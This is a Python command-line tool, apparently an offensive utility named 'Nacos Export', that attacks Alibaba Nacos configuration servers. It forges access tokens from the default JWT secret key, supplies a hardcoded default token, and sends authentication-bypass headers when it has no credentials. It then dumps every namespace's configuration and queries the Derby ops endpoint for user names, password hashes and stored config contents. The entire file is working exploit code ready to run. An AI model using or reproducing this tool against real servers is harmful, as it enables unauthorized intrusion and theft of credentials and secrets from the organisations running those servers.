import requests
import sys
import urllib3
urllib3.disable_warnings()
import time
from email.utils import parsedate
import jwt
import base64
import argparse
import textwrap
from colorama import Fore



VERSION = "v1.5.0"

BANNER =  """
 ______________
< Nacos Export >         @Author: Arm!tage
 --------------          @Version: {version}
        \\   ^__^
         \\  (oo)\\_______
            (__)\\       )\\/\\
                ||----w |         
                ||     ||

""".format(version=VERSION)


def print_success(message: str, color: bool = True):
    if color:
        print(f"{Fore.GREEN}[+]{Fore.RESET} {message}")
    else:
        print(f"[+] {message}")

def print_warning(message: str, color: bool = True):
    if color:
        print(f"{Fore.YELLOW}[!]{Fore.RESET} {message}")
    else:
        print(f"[!] {message}")

def print_failure(message: str, color: bool = True):
    if color:
        print(f"{Fore.RED}[-]{Fore.RESET} {message}")
    else:
        print(f"[-] {message}")

def print_info(message: str, color: bool = True):
    if color:
        print(f"{Fore.BLUE}[*]{Fore.RESET} {message}")
    else:
        print(f"[*] {message}")


class NacosExport:
    def __init__(self, target: str, colored: bool = True) -> None:
        self.target = target

        self.username = None
        self.password = None
        self.token = None
        self.secretkey = None

        self.verified = False

        self.proxies = dict()
        self.header = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36',
        }
        self.namespaces = list()
        self.count = 0

        self.colored = colored
        print_info(f"Target: {self.target}", self.colored)

    def set_user_pass(self, username:str , password: str):
        self.username = username
        self.password = password
        print_info(f"Set username: {self.username}", self.colored)
        print_info(f"Set password: {self.password}", self.colored)

    def set_secretkey(self, secretkey: str):
        self.secretkey = secretkey
        print_info(f"Set secretkey: {self.secretkey}", self.colored)

    def set_token(self, token: str = None):
        if self.username != None and self.password != None:
            login_1 = "/v1/auth/users/login"
            login_2 = "/v1/auth/login"

            login_params = {
                'username': self.username,
                'password': self.password,
                'namespaceId': ''
            }

            try:
                resp = requests.post(self.target + login_1, headers=self.header, data=login_params, proxies=self.proxies, verify=False)
                if resp.status_code == 200:
                    resp_json = resp.json()
                    token = resp_json.get("accessToken")
                else:
                    resp = requests.post(self.target + login_2, headers=self.header, data=login_params, proxies=self.proxies, verify=False)
                    token = resp.headers.get("Authorization")
            except Exception:
                pass
            if token == "":
                print("[!] login failed.")
                exit(0)
            else:
                self.token = token
                print_success(f"Set token: {self.token}", self.colored)
                self.verified = True

        elif self.secretkey != None:
            resp = requests.get(self.target , verify=False, proxies=self.proxies)
            times = resp.headers['Date']
            times = int(time.mktime(parsedate(times)))+18000
            secret_key = base64.b64encode(self.secretkey.encode('utf-8')).decode('utf-8')
            payload = {
                "sub": "nacos",
                "exp": times
            }
            self.token = jwt.encode(payload, secret_key, algorithm='HS256')
            print_success(f"JWT token: {self.token}", self.colored)
            self.verified = True

        elif token != None:
            self.token = token
            print_info(f"Set token: {self.token}")
            self.verified = True
        
        if self.verified:
            self.header["Accesstoken"] = self.token
            print_info(f"Set HTTP header (Accesstoken: {self.token})", self.colored)
            self.header["Authorization"] = self.token
            print_info(f"Set HTTP header (Authorization: {self.token})", self.colored)
        else:
            self.header['serverIdentity'] = "security"
            print_warning("Use bypass header (serverIdentity: security)", self.colored)
            self.header['User-Agent'] = "Nacos-Server"
            print_warning("Use bypass header (User-Agent: Nacos-Server)", self.colored)

    def enum_namespaces(self):
        path = "/v1/console/namespaces"
        params = {
            'namespaceId': '',
        }
        resp = requests.get(self.target + path, headers=self.header, params=params, proxies=self.proxies, verify=False)
        if resp.status_code == 200:
            resp_dict = resp.json()
            self.namespaces = resp_dict['data']

    def apidump(self):
        self.enum_namespaces()
        for namespace in self.namespaces:
            if namespace["configCount"] == 0:
                namespace["configCount"] = 1 
            PARAMS = {
                "search": "accurate",
                "dataId": "",
                "group": "",
                "appName": "",
                "config_tags": "",
                "pageNo": 1,
                "pageSize": namespace["configCount"],
                "tenant": namespace["namespace"],
                "namespaceId": ""
            }
            self.header["Accesstoken"] = self.token
            PARAMS["accessToken"] = self.token
            if not self.request_contents(self.header, PARAMS):
                print_failure("Token invalid.", self.colored)
        
    def sqldump(self):
        # dbs_query = "select * from sys.sysschemas"
        # users_query = "select * from nacos.users"
        # content_query = "select * from nacos.config_info"
        path = "/v1/cs/ops/derby"
        p1 = {"sql": "select * from nacos.users"}
        resp = requests.get(self.target + path, headers=self.header,  params=p1, proxies=self.proxies ,verify=False)
        if resp.status_code == 200:
            resp_json = resp.json()
            if resp_json["code"] == 200:
                for user in resp_json["data"]:
                    print("Username:", user["USERNAME"])
                    print("Password:", user["PASSWORD"])

        p2 = {"sql": "select * from nacos.config_info"}
        resp = requests.get(self.target + path, headers=self.header, params=p2, proxies=self.proxies, verify=False)
        if resp.status_code == 200:
            resp_json = resp.json()
            if resp_json["code"] == 200:
                for content in resp_json["data"]:
                    self.print_output("None", content["GROUP_ID"], content["DATA_ID"], content["CONTENT"])
                    self.count += 1

    def request_contents(self, header: dict, param:dict) -> bool:
        path = "/v1/cs/configs"
        resp = requests.get(self.target + path, headers=header, params=param, proxies=self.proxies, verify=False)
        if resp.status_code == 200:
            resp_json = resp.json()
            for item in resp_json["pageItems"]:
                self.print_output(param["tenant"], item["group"], item["dataId"], item["content"])
            
            return True
        else:
            return False
        
    def check(self):
        path = "/v1/cs/ops/derby?sql="
        resp = requests.get(self.target + path, headers=self.header, proxies=self.proxies ,verify=False).json()
        if resp["message"] == "The current storage mode is not Derby":
            print_success("Not derby")
        else:
            print_success("It's derby")
        
    def print_output(self, namespace: str, group:str, dataId: str, content: str):
        print("""

##################################################
[+] Namespace: {namespace}
[+] Group: {group}
[+] DataId: {dataid}
##################################################
""".format(namespace=namespace, group=group, dataid=dataId ))
        print(content, "\n")
        self.count += 1

    def set_proxy(self, url: str):  
        protocol = url.split('://')[0]
        self.proxies[protocol] = url


if __name__ == '__main__':

    parser = argparse.ArgumentParser(prog=sys.argv[0], formatter_class=argparse.RawDescriptionHelpFormatter,
    description=textwrap.dedent(BANNER))

    parser.add_argument("-u", "--url", required=True, type=str, help="NACOS url, before '/v1'")
    parser.add_argument("-U", "--username", type=str, help="NACOS username, default: nacos")
    parser.add_argument("-P", "--password", type=str, help="NACOS password, default: nacos")
    parser.add_argument("-T", "--token", type=str, help="token, default: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g")
    parser.add_argument("-S", "--secretkey", type=str, help="secretkey, default: SecretKey012345678901234567890123456789012345678901234567890123456789")
    parser.add_argument("--proxy", type=str, help="set proxy, example: http://127.0.0.1:8080")
    parser.add_argument("--check-derby", action='store_true', help="Check standalone mode")
    parser.add_argument("--apidump", action='store_true', help="extract NACOS config")
    parser.add_argument("--sqldump", action='store_true', help="extract NACOS config from Derby database")

    parser.add_argument("--no-color", action='store_false', help="Print without Color", )

    args = parser.parse_args()


    target = args.url.rstrip('/')
    print_info(f"Command: {' '.join(sys.argv)}", args.no_color)
    nacos = NacosExport(target, args.no_color)

    if args.proxy != None:
        nacos.set_proxy(args.proxy)
    if args.username != None and args.password != None:
        nacos.set_user_pass(args.username, args.password)
    if args.token != None:
        nacos.set_token(args.token)
    if args.secretkey != None:
        nacos.set_secretkey(args.secretkey)

    nacos.set_token()
    
    if args.apidump:
        nacos.apidump()
    if args.sqldump:
        nacos.sqldump()
    if args.check_derby:
        nacos.check()

    print_success(f"Count: {nacos.count}", args.no_color)
